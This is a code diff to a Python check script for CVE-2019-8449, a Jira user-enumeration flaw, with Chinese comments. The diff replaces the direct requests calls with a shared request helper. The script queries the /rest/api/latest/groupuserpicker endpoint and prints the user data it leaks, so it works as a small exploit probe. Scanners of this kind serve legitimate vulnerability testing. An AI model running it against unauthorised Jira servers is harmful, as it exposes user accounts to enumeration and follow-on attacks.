@@ -5,9 +5,8 @@ name: CVE-2019-8449漏洞
 description: CVE-2019-8449漏洞可允许远程攻击者枚举用户名,导致信息泄露.Exploit for Jira v2.1 - v8.3.4
 '''
 
-import requests
-from requests.packages.urllib3.exceptions import InsecureRequestWarning
-requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+from app.lib.utils.request import request
+
 
 class CVE_2019_8449_BaseVerify:
     def __init__(self, url):
@@ -42,7 +41,7 @@ class CVE_2019_8449_BaseVerify:
             self.url = "http://" + self.url
         check_url = self.url + '/rest/api/latest/groupuserpicker'
         try:
-            check_quest = requests.get(url = check_url, headers = self.headers, params = self.params, allow_redirects = False, verify = False)
+            check_quest = request.get(url = check_url, headers = self.headers, params = self.params)
             check_json = check_quest.json()
             print('存在CVE-2019-8449漏洞,结果为:', check_json)
             return True
